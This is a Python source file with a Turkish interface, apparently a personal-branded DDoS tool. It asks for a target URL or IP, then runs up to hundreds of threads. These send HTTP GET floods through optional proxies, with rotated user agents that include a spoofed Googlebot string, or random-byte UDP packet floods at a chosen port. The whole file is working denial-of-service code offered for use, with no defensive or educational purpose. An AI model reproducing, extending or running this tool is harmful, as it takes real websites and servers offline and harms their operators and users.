import os
import sys
import time
import random
import threading
import socket
import requests
from datetime import datetime

# Renkli çıktılar
class colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Banner
def show_banner():
    os.system('clear')
    print(f"""{colors.CYAN}{colors.BOLD}
    ██╗     ██╗   ██╗██╗  ██╗██╗  ██╗ █████╗ 
    ██║     ██║   ██║██║ ██╔╝██║  ██║██╔══██╗
    ██║     ██║   ██║█████╔╝ ███████║███████║
    ██║     ██║   ██║██╔═██╗ ██╔══██║██╔══██║
    ███████╗╚██████╔╝██║  ██╗██║  ██║██║  ██║
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
    {colors.RESET}{colors.YELLOW}
    [Luka için Özel Sürüm]
    {colors.RESET}""")

# IP adresi çözümleme
def resolve_ip(url):
    try:
        if url.startswith(('http://', 'https://')):
            domain = url.split('/')[2]
        else:
            domain = url
        return socket.gethostbyname(domain)
    except:
        print(f"{colors.RED}[!] IP çözümlenemedi!{colors.RESET}")
        return None

# Socket flood (IP hedef)
def ip_flood(target_ip, target_port):
    while not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(random._urandom(1024), (target_ip, target_port))
        except:
            pass

# HTTP flood (site hedef)
def http_flood(target_url, proxy=None):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
        "Connection": "keep-alive"
    }
    while not stop_flag:
        try:
            requests.get(target_url, headers=headers, proxies=proxy, timeout=3)
            print(f"{colors.GREEN}[+] Başarılı istek {datetime.now().strftime('%H:%M:%S')}{colors.RESET}", end="\r")
        except Exception as e:
            print(f"{colors.RED}[-] Hata: {str(e)[:30]}...{colors.RESET}", end="\r")

# Proxy yükleme
def load_proxies():
    try:
        with open('proxy.txt', 'r') as f:
            proxies = [{'http': f'http://{line.strip()}', 'https': f'http://{line.strip()}'} 
                      for line in f if line.strip()]
        return proxies if proxies else None
    except:
        return None

def main():
    global stop_flag
    stop_flag = False
    
    show_banner()
    
    # Hedef seçimi
    print(f"{colors.BLUE}[1] Site URL'si üzerinden DDoS")
    print(f"[2] IP adresi üzerinden DDoS{colors.RESET}")
    choice = input(f"{colors.YELLOW}[?] Seçiminiz (1/2): {colors.RESET}")
    
    if choice == "1":
        target_url = input(f"{colors.BLUE}[?] Hedef URL (örn: https://site.com): {colors.RESET}").strip()
        target_ip = resolve_ip(target_url)
        if not target_ip:
            return
        
        # Proxy kontrolü
        proxies = load_proxies()
        if proxies:
            print(f"{colors.GREEN}[+] {len(proxies)} proxy yüklendi!{colors.RESET}")
        else:
            print(f"{colors.YELLOW}[!] Direkt bağlantı kullanılacak{colors.RESET}")
        
        thread_count = int(input(f"{colors.BLUE}[?] Thread sayısı (1-100): {colors.RESET}") or 50)
        
        print(f"\n{colors.RED}[!] {target_url} hedefine saldırı başlatılıyor...{colors.RESET}")
        print(f"{colors.RED}[!] Durdurmak için CTRL+C{colors.RESET}\n")
        
        for i in range(thread_count):
            proxy = random.choice(proxies) if proxies else None
            t = threading.Thread(target=http_flood, args=(target_url, proxy), daemon=True)
            t.start()
            
    elif choice == "2":
        target_ip = input(f"{colors.BLUE}[?] Hedef IP: {colors.RESET}").strip()
        target_port = int(input(f"{colors.BLUE}[?] Port (varsayılan 80): {colors.RESET}") or 80)
        thread_count = int(input(f"{colors.BLUE}[?] Thread sayısı (1-500): {colors.RESET}") or 200)
        
        print(f"\n{colors.RED}[!] {target_ip}:{target_port} hedefine saldırı başlatılıyor...{colors.RESET}")
        print(f"{colors.RED}[!] Durdurmak için CTRL+C{colors.RESET}\n")
        
        for i in range(thread_count):
            t = threading.Thread(target=ip_flood, args=(target_ip, target_port), daemon=True)
            t.start()
    
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        stop_flag = True
        print(f"\n{colors.YELLOW}[!] Saldırı durduruldu{colors.RESET}")
        sys.exit(0)

# Global ayarlar
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
]

if __name__ == "__main__":
    main()
